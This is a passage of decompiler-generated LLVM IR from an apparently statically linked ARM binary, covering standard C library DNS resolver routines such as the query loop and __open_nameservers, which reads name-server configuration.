  %v1_15830 = inttoptr i32 %v0_157fc to i32*
  %v2_15830 = load i32, i32* %v1_15830, align 4
  store i32 %v2_15830, i32* @r0, align 4
  %v0_15834 = call i32 @free()
  br label %dec_label_pc_158c0

dec_label_pc_1583c:                               ; preds = %dec_label_pc_15824
  %v1_15844 = add i32 %v0_157fc, 16
  %v2_15844 = inttoptr i32 %v1_15844 to i32*
  %v3_15844 = load i32, i32* %v2_15844, align 4
  %v2_15848 = sub i32 %tmp155, %stack_var_-192.0
  %v1_1584c = add i32 %v2_15848, -1
  %v1_15850 = add i32 %v3_15844, 4
  %v2_15854 = mul i32 %v1_15850, %v1_1584c
  %v1_15858 = add i32 %v0_157fc, 32
  %v2_15858 = inttoptr i32 %v1_15858 to i32*
  %v3_15858 = load i32, i32* %v2_15858, align 4
  %v2_15860 = add i32 %v0_157fc, 36
  %v3_15860 = inttoptr i32 %v2_15860 to i32*
  store i32 %v1_1584c, i32* %v3_15860, align 4
  %tmp294 = icmp ugt i32 %v2_15854, %v3_15858
  br i1 %tmp294, label %dec_label_pc_158e8, label %dec_label_pc_1583c.dec_label_pc_158bc_crit_edge

dec_label_pc_1583c.dec_label_pc_158bc_crit_edge:  ; preds = %dec_label_pc_1583c
  %v1_158bc.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_158bc

dec_label_pc_15874:                               ; preds = %dec_label_pc_157cc
  %v3_15874 = load i32, i32* %stack_var_-140, align 4
  store i32 %v3_15874, i32* @r0, align 4
  %v0_15878 = call i32 @free()
  br i1 %v9_15884, label %dec_label_pc_1588c, label %dec_label_pc_158c0

dec_label_pc_1588c:                               ; preds = %dec_label_pc_15874
  %v0_1588c = load i32, i32* @r8, align 4
  %v1_1588c = add i32 %v0_1588c, 16
  %v2_1588c = inttoptr i32 %v1_1588c to i32*
  %v3_1588c = load i32, i32* %v2_1588c, align 4
  %v9_15894 = icmp eq i32 %v3_1588c, %tmp146
  br i1 %v9_15894, label %dec_label_pc_1589c, label %dec_label_pc_15994

dec_label_pc_1589c:                               ; preds = %dec_label_pc_1588c
  %v1_1589c = add i32 %v0_1588c, 36
  %v2_1589c = inttoptr i32 %v1_1589c to i32*
  %v3_1589c = load i32, i32* %v2_1589c, align 4
  %v1_158a0 = add i32 %v0_1588c, 28
  %v2_158a0 = inttoptr i32 %v1_158a0 to i32*
  %v3_158a0 = load i32, i32* %v2_158a0, align 4
  %v3_158a4 = mul i32 %v3_1589c, %tmp146
  %v4_158a4 = add i32 %v3_158a0, %v3_158a4
  store i32 %v4_158a4, i32* @r0, align 4
  store i32 %tmp146, i32* @r2, align 4
  %v0_158b0 = call i32 @memcpy()
  %v0_158b4 = load i32, i32* @r8, align 4
  %v1_158b4 = add i32 %v0_158b4, 36
  %v2_158b4 = inttoptr i32 %v1_158b4 to i32*
  %v3_158b4 = load i32, i32* %v2_158b4, align 4
  %v1_158b8 = add i32 %v3_158b4, 1
  br label %dec_label_pc_158bc

dec_label_pc_158bc:                               ; preds = %dec_label_pc_1583c.dec_label_pc_158bc_crit_edge, %dec_label_pc_1589c
  %v1_158bc = phi i32 [ %v0_158b4, %dec_label_pc_1589c ], [ %v1_158bc.pre, %dec_label_pc_1583c.dec_label_pc_158bc_crit_edge ]
  %storemerge5 = phi i32 [ %v1_158b8, %dec_label_pc_1589c ], [ 0, %dec_label_pc_1583c.dec_label_pc_158bc_crit_edge ]
  %v2_158bc = add i32 %v1_158bc, 36
  %v3_158bc = inttoptr i32 %v2_158bc to i32*
  store i32 %storemerge5, i32* %v3_158bc, align 4
  br label %dec_label_pc_158c0

dec_label_pc_158c0:                               ; preds = %dec_label_pc_15874, %dec_label_pc_15830, %dec_label_pc_158bc
  %stack_var_-212.1 = phi i32 [ 0, %dec_label_pc_158bc ], [ 0, %dec_label_pc_15874 ], [ %stack_var_-212.2, %dec_label_pc_15830 ]
  %v1_158c8 = add i32 %stack_var_-192.0, 1
  %v0_158d0 = load i32, i32* @r5, align 4
  %v2_158d0 = add i32 %v0_158d0, %v5_157a0
  store i32 %v2_158d0, i32* @r5, align 4
  br label %dec_label_pc_158d4

dec_label_pc_158d4:                               ; preds = %dec_label_pc_15778, %dec_label_pc_158c0
  %v0_15794 = phi i32 [ %v0_15768, %dec_label_pc_15778 ], [ %v2_158d0, %dec_label_pc_158c0 ]
  %stack_var_-212.2 = phi i32 [ 1, %dec_label_pc_15778 ], [ %stack_var_-212.1, %dec_label_pc_158c0 ]
  %stack_var_-192.0 = phi i32 [ 0, %dec_label_pc_15778 ], [ %v1_158c8, %dec_label_pc_158c0 ]
  %v2_158dc = sub i32 %stack_var_-192.0, %tmp155
  %v4_158dc = xor i32 %stack_var_-192.0, %tmp155
  %v5_158dc = xor i32 %v2_158dc, %stack_var_-192.0
  %v6_158dc = and i32 %v5_158dc, %v4_158dc
  %v5_158e0 = icmp slt i32 %stack_var_-192.0, %tmp155
  br i1 %v5_158e0, label %bb204, label %bb205

bb204:                                            ; preds = %dec_label_pc_158d4
  %v7_158e0 = load i32, i32* @fp, align 4
  %v8_158e0 = sub i32 %v0_15794, %v7_158e0
  %v10_158e0 = xor i32 %v7_158e0, %v0_15794
  %v11_158e0 = xor i32 %v8_158e0, %v0_15794
  %v12_158e0 = and i32 %v11_158e0, %v10_158e0
  br label %bb205

bb205:                                            ; preds = %dec_label_pc_158d4, %bb204
  %v1_158e4.in = phi i32 [ %v6_158dc, %dec_label_pc_158d4 ], [ %v12_158e0, %bb204 ]
  %v0_158e4.in = phi i32 [ %v2_158dc, %dec_label_pc_158d4 ], [ %v8_158e0, %bb204 ]
  %v0_158e4 = icmp slt i32 %v0_158e4.in, 0
  %v1_158e4 = icmp slt i32 %v1_158e4.in, 0
  %v2_158e4 = xor i1 %v1_158e4, %v0_158e4
  br i1 %v2_158e4, label %dec_label_pc_1578c, label %dec_label_pc_158e8

dec_label_pc_158e8:                               ; preds = %dec_label_pc_157bc, %bb203, %dec_label_pc_1583c, %dec_label_pc_15808, %bb205
  %v1_158ec = call i32 @__libc_close(i32 %v0_155cc)
  %v3_158f0 = load i32, i32* %stack_var_0, align 4
  %v2_158f4 = icmp eq i32 %v3_158f0, 0
  br i1 %v2_158f4, label %.thread26, label %bb206

bb206:                                            ; preds = %dec_label_pc_158e8
  %v1_158fc = load i32, i32* @r7, align 4
  %v3_158f8 = inttoptr i32 %v3_158f0 to i32*
  store i32 %v1_158fc, i32* %v3_158f8, align 4
  br label %bb207

.thread26:                                        ; preds = %dec_label_pc_158e8
  br label %bb207

bb207:                                            ; preds = %bb206, %.thread26
  store i32 88324, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_158f4, i32 ptrtoint (i32* @global_var_127a8.598 to i32))
  %v2_15904 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_15904, i32* @r0, align 4
  store i32 %v2_15398, i32* @r4, align 4
  %v0_1590c = call i32 @free()
  store i32 %v2_15398, i32* @r0, align 4
  %v1_15924 = call i32 @__pthread_return_void()
  %v1_15934 = call i32 @__pthread_return_0()
  %v0_15940 = load i32, i32* @r6, align 4
  %v3_15940 = sdiv i32 %v0_15940, 256
  store i32 %v3_15940, i32* @ip, align 4
  %v0_15944 = load i32, i32* @sl, align 4
  store i32 %v0_15944, i32* @global_var_2a3e8.870, align 4
  store i32 %v2_15398, i32* @r0, align 4
  %v1_15950 = trunc i32 %v3_15940 to i8
  store i8 %v1_15950, i8* @global_var_24135.873, align 1
  %v1_15954 = trunc i32 %v0_15940 to i8
  store i8 %v1_15954, i8* bitcast (i8** @global_var_24134.872 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_15964.884 to i32), i32* @lr, align 4
  %v1_15960 = call i32 @__pthread_return_void()
  %v0_15aec.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_15aec

dec_label_pc_15968:                               ; preds = %dec_label_pc_155fc, %dec_label_pc_1561c
  %v0_15968 = load i32, i32* @sl, align 4
  %v1_15968 = add i32 %v0_15968, 1
  %v2_15970 = srem i32 %v1_15968, %arg3
  store i32 %v2_15970, i32* @sl, align 4
  %v2_15974 = icmp eq i32 %v2_15970, 0
  br i1 %v2_15974, label %dec_label_pc_1597c, label %dec_label_pc_15a34.backedge

dec_label_pc_1597c:                               ; preds = %dec_label_pc_15968
  %v1_15984 = add i32 %stack_var_-208.567, 1
  br label %dec_label_pc_15a38.outer.backedge

dec_label_pc_15a38.outer.backedge:                ; preds = %dec_label_pc_1597c, %dec_label_pc_15a18, %.thread19
  %stack_var_-204.1.ph.be = phi i32 [ %v7_15710, %.thread19 ], [ -1, %dec_label_pc_15a18 ], [ -1, %dec_label_pc_1597c ]
  %stack_var_-208.5.ph.be = phi i32 [ %stack_var_-208.567, %.thread19 ], [ %v1_15a20, %dec_label_pc_15a18 ], [ %v1_15984, %dec_label_pc_1597c ]
  %tmp295 = icmp ult i32 %stack_var_-208.5.ph.be, 3
  br i1 %tmp295, label %dec_label_pc_1541c.lr.ph, label %dec_label_pc_15a54

dec_label_pc_15994:                               ; preds = %dec_label_pc_1588c
  %v1_15994 = inttoptr i32 %v0_1588c to i32*
  %v2_15994 = load i32, i32* %v1_15994, align 4
  store i32 %v2_15994, i32* @r0, align 4
  %v0_15998 = call i32 @free()
  br label %dec_label_pc_1599c

dec_label_pc_1599c:                               ; preds = %dec_label_pc_1572c, %dec_label_pc_15680, %dec_label_pc_157bc, %dec_label_pc_157b0, %dec_label_pc_15698, %dec_label_pc_15660, %dec_label_pc_15994
  br i1 %v2_159a0, label %dec_label_pc_159a8, label %dec_label_pc_15a04

dec_label_pc_159a8:                               ; preds = %dec_label_pc_1599c
  store i32 %v2_15398, i32* @r5, align 4
  store i32 %v2_15398, i32* @r0, align 4
  %v1_159c0 = call i32 @__pthread_return_void()
  %v1_159d0 = call i32 @__pthread_return_0()
  %v2_159dc = load i32, i32* @global_var_2a4b8.878, align 4
  store i32 %v2_15398, i32* @r0, align 4
  %v1_159ec = call i32 @__pthread_return_void()
  %v1_159f4 = add i32 %v2_159dc, -1
  store i32 %v1_159f4, i32* @r4, align 4
  %v5_159fc = icmp slt i32 %v6_159fc, %v1_159f4
  br i1 %v5_159fc, label %.thread27, label %dec_label_pc_15a04

.thread27:                                        ; preds = %dec_label_pc_159a8
  %v7_159fc = add i32 %v6_159fc, 1
  br label %dec_label_pc_15a34.backedge

dec_label_pc_15a04:                               ; preds = %dec_label_pc_159a8, %dec_label_pc_1599c
  %v0_15a04 = load i32, i32* @sl, align 4
  %v1_15a04 = add i32 %v0_15a04, 1
  %v2_15a0c = srem i32 %v1_15a04, %arg3
  store i32 %v2_15a0c, i32* @sl, align 4
  %v2_15a10 = icmp eq i32 %v2_15a0c, 0
  br i1 %v2_15a10, label %dec_label_pc_15a18, label %dec_label_pc_15a34.backedge

dec_label_pc_15a18:                               ; preds = %dec_label_pc_15a04
  %v1_15a20 = add i32 %stack_var_-208.567, 1
  br label %dec_label_pc_15a38.outer.backedge

dec_label_pc_15a34.backedge:                      ; preds = %dec_label_pc_15968, %dec_label_pc_15a04, %.thread27
  %storemerge87 = phi i32 [ %v7_159fc, %.thread27 ], [ -1, %dec_label_pc_15a04 ], [ -1, %dec_label_pc_15968 ]
  %tmp296 = icmp ult i32 %stack_var_-208.567, 3
  br i1 %tmp296, label %dec_label_pc_1541c.lr.ph.preheader, label %dec_label_pc_15a54

dec_label_pc_1541c.lr.ph.preheader:               ; preds = %dec_label_pc_1541c.lr.ph.preheader.lr.ph, %dec_label_pc_15a34.backedge
  %stack_var_-216.0261 = phi i32 [ -1, %dec_label_pc_1541c.lr.ph.preheader.lr.ph ], [ %v0_155cc, %dec_label_pc_15a34.backedge ]
  %stack_var_-208.4260 = phi i32 [ %v0_15414, %dec_label_pc_1541c.lr.ph.preheader.lr.ph ], [ %stack_var_-208.567, %dec_label_pc_15a34.backedge ]
  %v0_15a34259 = phi i32 [ -1, %dec_label_pc_1541c.lr.ph.preheader.lr.ph ], [ %storemerge87, %dec_label_pc_15a34.backedge ]
  br label %dec_label_pc_1541c.lr.ph

dec_label_pc_1541c.lr.ph:                         ; preds = %dec_label_pc_1541c.lr.ph.preheader, %dec_label_pc_15a38.outer.backedge
  %stack_var_-216.1.ph84 = phi i32 [ %v0_155cc, %dec_label_pc_15a38.outer.backedge ], [ %stack_var_-216.0261, %dec_label_pc_1541c.lr.ph.preheader ]
  %stack_var_-208.5.ph83 = phi i32 [ %stack_var_-208.5.ph.be, %dec_label_pc_15a38.outer.backedge ], [ %stack_var_-208.4260, %dec_label_pc_1541c.lr.ph.preheader ]
  %v6_159fc = phi i32 [ %stack_var_-204.1.ph.be, %dec_label_pc_15a38.outer.backedge ], [ %v0_15a34259, %dec_label_pc_1541c.lr.ph.preheader ]
  %v1_154c4 = icmp slt i32 %v6_159fc, 0
  %v4_15500 = mul i32 %v6_159fc, 4
  %v5_15500 = add i32 %v4_15500, ptrtoint (i32* @global_var_2a498.882 to i32)
  %v6_15500 = inttoptr i32 %v5_15500 to i32*
  br label %dec_label_pc_1541c

dec_label_pc_15a48:                               ; preds = %bb195, %.thread8, %dec_label_pc_15374, %dec_label_pc_15368
  store i32 -1, i32* @sl, align 4
  store i32 -1, i32* @sb, align 4
  br label %dec_label_pc_15a54

dec_label_pc_15a54:                               ; preds = %dec_label_pc_15384, %dec_label_pc_15a34.backedge, %dec_label_pc_15a38.outer.backedge, %bb200, %dec_label_pc_1550c, %dec_label_pc_15a38.backedge, %dec_label_pc_15a48
  %stack_var_-216.2 = phi i32 [ -1, %dec_label_pc_15a48 ], [ %v0_155cc, %dec_label_pc_15a38.backedge ], [ %v1_15424, %dec_label_pc_1550c ], [ %v1_15424, %bb200 ], [ %v0_155cc, %dec_label_pc_15a38.outer.backedge ], [ -1, %dec_label_pc_15384 ], [ %v0_155cc, %dec_label_pc_15a34.backedge ]
  %v0_15a54 = call i32 @__GI___h_errno_location()
  %v2_15a5c = inttoptr i32 %v0_15a54 to i32*
  store i32 -1, i32* %v2_15a5c, align 4
  %v0_15a60 = load i32, i32* @sb, align 4
  store i32 %v0_15a60, i32* @r6, align 4
  br label %dec_label_pc_15a64

dec_label_pc_15a64:                               ; preds = %dec_label_pc_15750, %dec_label_pc_15a54
  %v1_15a6c = phi i32 [ %stack_var_-216.2, %dec_label_pc_15a54 ], [ %v0_155cc, %dec_label_pc_15750 ]
  %v7_15a68 = icmp eq i32 %v1_15a6c, -1
  br i1 %v7_15a68, label %bb209, label %bb208

bb208:                                            ; preds = %dec_label_pc_15a64
  br label %bb209

bb209:                                            ; preds = %dec_label_pc_15a64, %bb208
  store i32 88692, i32* @lr, align 4
  %v1_15a70 = xor i1 %v7_15a68, true
  call void @__pseudo_cond_branch(i1 %v1_15a70, i32 ptrtoint (i32* @global_var_f6d8.875 to i32))
  %v2_15a74 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_15a74, i32* @r0, align 4
  %v0_15a78 = call i32 @free()
  %v0_15a7c = load i32, i32* @r7, align 4
  store i32 %v0_15a7c, i32* @r0, align 4
  %v0_15a80 = call i32 @free()
  %v0_15a84 = load i32, i32* @sl, align 4
  %v7_15a84 = icmp eq i32 %v0_15a84, -1
  br i1 %v7_15a84, label %bb210, label %dec_label_pc_15a90

bb210:                                            ; preds = %bb209
  br label %dec_label_pc_15aec

dec_label_pc_15a90:                               ; preds = %bb209
  %v2_15a90 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_15a90, i32* @r0, align 4
  %v1_15aa8 = call i32 @__pthread_return_void()
  %v1_15ab8 = call i32 @__pthread_return_0()
  %v0_15ac4 = load i32, i32* @r6, align 4
  %v3_15ac4 = sdiv i32 %v0_15ac4, 256
  store i32 %v3_15ac4, i32* @ip, align 4
  %v0_15ac8 = load i32, i32* @sl, align 4
  store i32 %v0_15ac8, i32* @global_var_2a3e8.870, align 4
  store i32 %v2_15a90, i32* @r0, align 4
  %v1_15ad4 = trunc i32 %v3_15ac4 to i8
  store i8 %v1_15ad4, i8* @global_var_24135.873, align 1
  %v1_15ad8 = trunc i32 %v0_15ac4 to i8
  store i8 %v1_15ad8, i8* bitcast (i8** @global_var_24134.872 to i8*), align 4
  store i32 88808, i32* @lr, align 4
  %v1_15ae4 = call i32 @__pthread_return_void()
  br label %dec_label_pc_15aec

dec_label_pc_15aec:                               ; preds = %bb210, %bb207, %dec_label_pc_15a90
  %v0_15aec = phi i32 [ %v0_15a84, %bb210 ], [ %v0_15aec.pre, %bb207 ], [ -1, %dec_label_pc_15a90 ]
  store i32 %v3_15320, i32* @r4, align 4
  store i32 %v6_15320, i32* @r5, align 4
  store i32 %v9_15320, i32* @r6, align 4
  store i32 %v12_15320, i32* @r7, align 4
  store i32 %v15_15320, i32* @r8, align 4
  store i32 %v18_15320, i32* @sb, align 4
  store i32 %v21_15320, i32* @sl, align 4
  ret i32 %v0_15aec

; uselistorder directives
  uselistorder i32 %v3_15ac4, { 1, 0 }
  uselistorder i32 %v0_15ac4, { 1, 0 }
  uselistorder i32 %v0_15a84, { 1, 0 }
  uselistorder i1 %v7_15a68, { 1, 0 }
  uselistorder i32 %v6_159fc, { 2, 6, 3, 4, 1, 5, 0 }
  uselistorder i32 %stack_var_-208.5.ph.be, { 1, 0 }
  uselistorder i32 %v3_15940, { 1, 0 }
  uselistorder i32 %v0_15940, { 1, 0 }
  uselistorder i32 %stack_var_-192.0, { 6, 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %stack_var_-212.2, { 1, 0 }
  uselistorder i32 %v0_15794, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1588c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1584c, { 1, 0 }
  uselistorder i32 %v0_1576c, { 1, 0 }
  uselistorder i32 %v0_15770, { 1, 0 }
  uselistorder i32 %v6_15670, { 1, 0 }
  uselistorder i32 %v0_155cc, { 5, 0, 1, 2, 3, 4, 6, 8, 7, 10, 9, 12, 13, 11 }
  uselistorder i32 %v1_15538, { 1, 0 }
  uselistorder i32 %v2_154d8, { 1, 0 }
  uselistorder i32 %v1_15450, { 1, 2, 0 }
  uselistorder i1 %v7_15420, { 1, 0 }
  uselistorder i32 %stack_var_-208.567, { 2, 1, 4, 5, 3, 0 }
  uselistorder i32 %v1_15424, { 1, 2, 0 }
  uselistorder i32 %v0_15414, { 1, 0 }
  uselistorder i32 %v2_15398, { 6, 7, 8, 0, 1, 2, 3, 4, 5, 9, 10, 11, 12, 13 }
  uselistorder i32* %stack_var_-236, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i8* %stack_var_-188, { 4, 3, 1, 0, 2 }
  uselistorder i8* %stack_var_-100, { 3, 0, 2, 1 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32* %stack_var_-140, { 1, 0, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32 %tmp155, { 2, 0, 4, 1, 3 }
  uselistorder i32 %tmp146, { 1, 0, 2 }
  uselistorder i32 %tmp, { 2, 1, 0 }
  uselistorder i32 (i32)* @__libc_close, { 11, 14, 13, 12, 17, 16, 15, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32*, i32, i32)* @__libc_send, { 8, 7, 0, 1, 2, 3, 4, 5, 6, 9, 10, 11, 12 }
  uselistorder i32 101, { 5, 1, 2, 3, 0, 4 }
  uselistorder i32 (i32, %sockaddr*, i32)* @__libc_connect, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 ()* @socket, { 1, 9, 2, 7, 6, 5, 4, 3, 8, 0 }
  uselistorder i32 (i32)* @inet_addr, { 2, 3, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @strncpy, { 2, 1, 0, 3 }
  uselistorder i8* @global_var_24135.873, { 2, 1, 0 }
  uselistorder i32 512, { 3, 8, 2, 9, 1, 4, 5, 6, 7, 0 }
  uselistorder i32 %arg2, { 2, 4, 5, 0, 1, 3 }
  uselistorder label %dec_label_pc_15aec, { 2, 0, 1 }
  uselistorder label %bb209, { 1, 0 }
  uselistorder label %dec_label_pc_15a64, { 1, 0 }
  uselistorder label %dec_label_pc_15a54, { 6, 1, 2, 5, 4, 3, 0 }
  uselistorder label %dec_label_pc_15a48, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1541c.lr.ph.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_15a34.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1599c, { 6, 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_15a38.outer.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15968, { 1, 0 }
  uselistorder label %bb207, { 1, 0 }
  uselistorder label %dec_label_pc_158e8, { 4, 2, 1, 3, 0 }
  uselistorder label %bb205, { 1, 0 }
  uselistorder label %dec_label_pc_158d4, { 1, 0 }
  uselistorder label %dec_label_pc_158c0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_158bc, { 1, 0 }
  uselistorder label %dec_label_pc_15824, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15760, { 1, 0 }
  uselistorder label %dec_label_pc_15750, { 1, 0 }
  uselistorder label %dec_label_pc_15a38.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_155b8, { 1, 0 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %dec_label_pc_1550c, { 2, 0, 1 }
  uselistorder label %bb200, { 1, 0 }
}

define i32 @"$d"(i32 %arg1, i32 %arg2, i64* %arg3) local_unnamed_addr {
dec_label_pc_15af8:
  %v0_15af8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15af8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_15af8
  %v5_15af8 = mul i32 %arg2, 256
  %v6_15af8 = and i32 %v5_15af8, %arg1
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_15af8, %bb
  %v10_15b28 = phi i32 [ %arg1, %dec_label_pc_15af8 ], [ %v6_15af8, %bb ]
  ret i32 %v10_15b28

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__open_nameservers(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_15b2c = load i32, i32* @r4, align 4
  store i32 %v3_15b2c, i32* %stack_var_-28, align 4
  %v6_15b2c = load i32, i32* @r5, align 4
  %v9_15b2c = load i32, i32* @r6, align 4
  %v12_15b2c = load i32, i32* @r7, align 4
  %v15_15b2c = load i32, i32* @r8, align 4
  %v18_15b2c = load i32, i32* @sl, align 4
  %v2_15b30 = ptrtoint i32* %stack_var_-192 to i32
  %v2_15b34 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_15b34, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_24138.715 to i32), i32* %r2.global-to-local, align 4
  %v1_15b48 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_24138.715 to i32), i32* %r0.global-to-local, align 4
  store i32 88924, i32* @lr, align 4
  %v1_15b58 = call i32 @__pthread_return_0()
  store i32 %v1_15b58, i32* %r0.global-to-local, align 4
  %v2_15b60 = load i32, i32* @global_var_2a4b4.720, align 4
  %v5_15b68 = icmp sgt i32 %v2_15b60, 0
  br i1 %v5_15b68, label %dec_label_pc_15da4, label %dec_label_pc_15b6c

dec_label_pc_15b6c:                               ; preds = %entry
  store i32 ptrtoint ([17 x i8]* @global_var_1afec.891 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1b000.893 to i32), i32* @r1, align 4
  %v3_15b74 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_1afec.891 to i32), i32 ptrtoint (i32* @global_var_1b000.893 to i32))
  store i32 %v3_15b74, i32* %r0.global-to-local, align 4
  store i32 %v3_15b74, i32* @sl, align 4
  %v2_15b78 = icmp eq i32 %v3_15b74, 0
  br i1 %v2_15b78, label %dec_label_pc_15b80, label %dec_label_pc_15d6c.preheader

dec_label_pc_15b80:                               ; preds = %dec_label_pc_15b6c
  store i32 ptrtoint ([24 x i8]* @global_var_1b004.895 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1b000.893 to i32), i32* @r1, align 4
  %v3_15b88 = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_1b004.895 to i32), i32 ptrtoint (i32* @global_var_1b000.893 to i32))
  store i32 %v3_15b88, i32* %r0.global-to-local, align 4
  store i32 %v3_15b88, i32* @sl, align 4
  %v2_15b8c = icmp eq i32 %v3_15b88, 0
  br i1 %v2_15b8c, label %dec_label_pc_15d98, label %dec_label_pc_15d6c.preheader

dec_label_pc_15d6c.preheader:                     ; preds = %dec_label_pc_15b6c, %dec_label_pc_15b80
  %v0_15d7426 = phi i32 [ %v3_15b74, %dec_label_pc_15b6c ], [ %v3_15b88, %dec_label_pc_15b80 ]
  %v2_15be0 = ptrtoint i32* %stack_var_-28 to i32
  %v3_15c7c = inttoptr i32 %tmp to i8*
  store i32 %v2_15b30, i32* %r0.global-to-local, align 4
  store i32 %v0_15d7426, i32* %r2.global-to-local, align 4
  %v3_15d7866 = call i32 @fgets(i32 %v2_15b30, i32 128, i32 %v0_15d7426)
  store i32 %v3_15d7866, i32* %r0.global-to-local, align 4
  %v2_15d7c68 = icmp eq i32 %v3_15d7866, 0
  store i32 %v2_15b30, i32* @r4, align 4
  br i1 %v2_15d7c68, label %dec_label_pc_15d8c, label %dec_label_pc_15b9c.preheader.lr.ph

dec_label_pc_15b9c.preheader.lr.ph:               ; preds = %dec_label_pc_15d6c.preheader
  %v1_15b9c11 = bitcast i32* %stack_var_-192 to i8*
  br label %dec_label_pc_15b9c.preheader

dec_label_pc_15b98:                               ; preds = %dec_label_pc_15ba8
  %v1_15b98 = add i32 %v0_15b98, 1
  store i32 %v1_15b98, i32* %r0.global-to-local, align 4
  %v1_15b9c = inttoptr i32 %v1_15b98 to i8*
  %v2_15b9c = load i8, i8* %v1_15b9c, align 1
  %v3_15b9c = zext i8 %v2_15b9c to i32
  store i32 %v3_15b9c, i32* %r2.global-to-local, align 4
  %v2_15ba0 = icmp eq i8 %v2_15b9c, 0
  br i1 %v2_15ba0, label %dec_label_pc_15bbc, label %dec_label_pc_15ba8

dec_label_pc_15ba8:                               ; preds = %dec_label_pc_15ba8.lr.ph, %dec_label_pc_15b98
  %v0_15b98 = phi i32 [ %v2_15b30, %dec_label_pc_15ba8.lr.ph ], [ %v1_15b98, %dec_label_pc_15b98 ]
  %v1_15bb0 = phi i32 [ %v3_15b9c13, %dec_label_pc_15ba8.lr.ph ], [ %v3_15b9c, %dec_label_pc_15b98 ]
  %v3_15bb0 = mul nuw nsw i32 %v1_15bb0, 2
  %v4_15bb0 = add i32 %v3_15bb0, %v2_15bac.pre
  %v5_15bb0 = inttoptr i32 %v4_15bb0 to i8*
  %v6_15bb0 = load i8, i8* %v5_15bb0, align 1
  %v1_15bb4 = and i8 %v6_15bb0, 32
  %v2_15bb4 = icmp eq i8 %v1_15bb4, 0
  br i1 %v2_15bb4, label %dec_label_pc_15bbc, label %dec_label_pc_15b98

dec_label_pc_15bbc:                               ; preds = %dec_label_pc_15b98, %dec_label_pc_15ba8, %dec_label_pc_15b9c.preheader
  %v0_15c5435 = phi i32 [ %v2_15b30, %dec_label_pc_15b9c.preheader ], [ %v1_15b98, %dec_label_pc_15b98 ], [ %v0_15b98, %dec_label_pc_15ba8 ]
  %v0_15bd0 = phi i32 [ %v3_15b9c13, %dec_label_pc_15b9c.preheader ], [ %v3_15b9c, %dec_label_pc_15b98 ], [ %v1_15bb0, %dec_label_pc_15ba8 ]
  %v7_15bbc = icmp eq i32 %v0_15bd0, 10
  br i1 %v7_15bbc, label %.thread3, label %bb

bb:                                               ; preds = %dec_label_pc_15bbc
  %v3_15bc0 = icmp eq i32 %v0_15bd0, 0
  br i1 %v3_15bc0, label %bb55, label %dec_label_pc_15bd0

.thread3:                                         ; preds = %dec_label_pc_15bbc
  br label %dec_label_pc_15d6c.backedge

bb55:                                             ; preds = %bb
  br label %dec_label_pc_15d6c.backedge

dec_label_pc_15d6c.backedge:                      ; preds = %dec_label_pc_15d48, %dec_label_pc_15d60, %bb55, %dec_label_pc_15ce0, %.thread3, %dec_label_pc_15bd0
  %v0_15d74.pre = load i32, i32* @sl, align 4
  store i32 %v2_15b30, i32* %r0.global-to-local, align 4
  store i32 %v0_15d74.pre, i32* %r2.global-to-local, align 4
  %v3_15d78 = call i32 @fgets(i32 %v2_15b30, i32 128, i32 %v0_15d74.pre)
  store i32 %v3_15d78, i32* %r0.global-to-local, align 4
  %v2_15d7c = icmp eq i32 %v3_15d78, 0
  store i32 %v2_15b30, i32* @r4, align 4
  br i1 %v2_15d7c, label %dec_label_pc_15d8c, label %dec_label_pc_15b9c.preheader

dec_label_pc_15bd0:                               ; preds = %bb
  %v7_15bd0 = icmp eq i32 %v0_15bd0, 35
  br i1 %v7_15bd0, label %dec_label_pc_15d6c.backedge, label %dec_label_pc_15c54

dec_label_pc_15be0:                               ; preds = %bb58
  store i32 %v2_15be0, i32* %r2.global-to-local, align 4
  %v4_15be4 = mul i32 %storemerge, 4
  %v5_15be4 = add i32 %v4_15be4, %v2_15be0
  %v2_15be8 = add i32 %v5_15be4, -36
  %v3_15be8 = inttoptr i32 %v2_15be8 to i32*
  store i32 %v0_15be8, i32* %v3_15be8, align 4
  %v0_15bf415 = load i32, i32* %r0.global-to-local, align 4
  %v1_15bf416 = inttoptr i32 %v0_15bf415 to i8*
